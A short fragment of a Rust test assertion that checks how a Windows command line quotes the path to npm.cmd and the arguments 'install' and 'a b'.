         assert_eq!(
             arg,
             "\"\"C:\\Program Files\\nodejs\\npm.cmd\" \"install\" \"a b\"\""
